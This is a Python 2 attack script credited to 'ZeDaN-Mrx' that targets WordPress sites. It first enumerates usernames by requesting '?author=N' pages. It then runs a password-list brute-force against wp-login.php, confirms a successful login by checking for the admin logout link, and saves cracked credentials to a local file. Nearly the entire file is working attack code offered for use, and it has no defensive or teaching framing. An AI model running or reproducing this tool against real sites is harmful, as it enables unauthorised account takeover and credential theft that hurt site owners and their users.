import sys , re , urllib2 , urllib , cookielib , os, socket
try :
    import requests
except ImportError :
    print "pip install requests"
    sys.exit()
'''
BruteForce Only For Wordpress Sites ! 
By : ZeDaN-Mrx
'''
class Zedan:
	def check(self):
		try:
			oid = site.split("/")
			odi = oid[2]
			try:
				dio = socket.gethostbyname(odi)
			except:
				exit(-1)
		except:
			print "[-] Please Check URL !"
			exit(-1)
	def xa(slef):
		print "[+] Scanning"
		for i in range(int(NUMX)):
			send = site+'/?author='+str(i)
			try:
				o = Fuhrer.get(send)
				if o.status_code == 200:
					data = o.content
					title = re.findall("<title>(.*?)</title>" , data)
					user = re.search("(.*?) |" , title[0]).group(1)
					print str(i)+"-"+"[+] User Detected : "+user
					users.append(user)
				else:
					print str(i)+"-"+"[-] Searching.."
			except:
				print str(i)+"-"+"[-] Can't Detect User"

			if len(users) == 0:
				oo = users.append("admin")
				print "[~] I Will Use 'Admin' to Brute "
			else:
				pass                
	def brute(self):
		try:
			xads = sys.argv[2]
			with open(xads) as zCheck:
				if sum(1 for _ in zCheck) == 0:
					print "The File "+xads+" is Empty !"
					exit(-1)
				else:
					passlist = open(xads,"r")
					for password in passlist:
						password = password.rstrip()
						for user in users:
							print "[+] Trying With : " + user +"|"+ password
							Cookies = cookielib.CookieJar()
							openitplz = urllib2.build_opener(urllib2.HTTPCookieProcessor(Cookies))
							dataforlogin = urllib.urlencode({'log' : user, 'pwd' : password})
							try:
								f4ck = site+"/wp-login.php"
								f4ckwp = site+"/wp-admin"
								f = Fuhrer.get(f4ck)
								if f.status_code == 200:
									try:
										openitplz.open(str(f4ck), dataforlogin)
										readitplz = openitplz.open(str(f4ckwp))
										lastone = readitplz.read()
										if '<li id="wp-admin-bar-logout">' in lastone:
											print "[+] => Cracked | Done !"
											with open("Info.txt","a") as nowwriteplz:
												nowwriteplz.writelines(f4ck+"#"+user+"@"+password+"\n")
											break
										else:
											print "[-] => Wrong .:LoginData !"
									except Exception, Mrx:
										print "[!]" + str(Mrx)
										sys.exit()
							except Exception,Mrx:
								print "[!] WP-Login Error :  404\n"+str(Mrx)
								sys.exit()
		except Exception, Mrx:
			print "[!]Usage : script.py http://localhost passlist.txt\n" + str(Mrx)
			sys.exit()


if __name__ == "__main__":
	os.system('cls' if os.name == 'nt' else 'clear')
	print """\n[+] Wordpress Sites BruteForce & Auto Username Detector By : ZeDaN-Mrx\n[+] Instagram : @xFuhr3r\n"""
	users = []
	Fuhrer = requests.session()
	site = sys.argv[1]
	try:
		print "[+] Url is " + site
	except Exception, Mrx:
		print "Check Site Please !\n" + str(Mrx)
		sys.exit()
	NUMX = sys.argv[3]
	try:
		(int(NUMX))
	except:
		print "[-] Not Valid NuMber !"
		exit(-1)
	fd = Zedan()
	fd.check()
	fd.xa()
	fd.brute()
